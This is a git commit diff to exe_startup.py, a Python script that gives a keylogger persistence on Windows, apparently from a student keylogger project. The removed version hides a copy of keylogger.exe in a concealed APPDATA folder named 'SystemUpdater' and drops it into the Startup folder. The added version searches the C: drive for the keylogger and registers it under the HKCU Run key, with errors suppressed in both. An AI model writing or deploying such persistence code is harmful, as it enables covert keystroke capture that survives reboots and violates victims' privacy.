5b406f1814c657a2c0b213a4ffab6984f021e02d
atharva-010 <shindeatharva676@gmail.com>
2025-03-11 20:00:16 +0530

    Update exe_startup.py

--- exe_startup.py
+++ exe_startup.py
@@ -1,43 +1,22 @@
+import winreg as reg
 import os
-import shutil
-import ctypes
 
-def hide_folder(folder_path):
-    FILE_ATTRIBUTE_HIDDEN = 0x02
+def find_exe(filename):
+    for root, _, files in os.walk("C:\\"):
+        if filename in files:
+            return os.path.join(root, filename)
+    return None
+
+def add_to_registry(exe_path, app_name="MyApp"):
+    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+
     try:
-        ctypes.windll.kernel32.SetFileAttributesW(folder_path, FILE_ATTRIBUTE_HIDDEN)
-    except:
-        pass  
+        reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE)
+        reg.SetValueEx(reg_key, app_name, 0, reg.REG_SZ, exe_path)
+        reg.CloseKey(reg_key)
+    except Exception:
+        pass
 
-def create_hidden_backup(exe_path):
-    hidden_folder = os.path.join(os.getenv("APPDATA"), "SystemUpdater")
-    os.makedirs(hidden_folder, exist_ok=True)
-    hide_folder(hidden_folder)  
-    
-    backup_exe_path = os.path.join(hidden_folder, os.path.basename(exe_path))
-    try:
-        shutil.copyfile(exe_path, backup_exe_path)
-    except:
-        return None  
-    
-    return backup_exe_path
-
-def add_to_startup_folder(exe_path):
-    startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
-    
-    if not os.path.exists(startup_folder):
-        return  
-
-    shortcut_path = os.path.join(startup_folder, os.path.basename(exe_path))
-    try:
-        shutil.copyfile(exe_path, shortcut_path)
-    except:
-        pass  
-
-if __name__ == "__main__":
-    target_exe = r"C:\ATHARVA\NMIMS\Sem 6\REMA\Project\Python-Keylogger\dist\keylogger.exe"
-
-    backup_path = create_hidden_backup(target_exe)
-    
-    if backup_path:  
-        add_to_startup_folder(backup_path)
+exe_path = find_exe("keylogger.exe")
+if exe_path:
+    add_to_registry(exe_path)
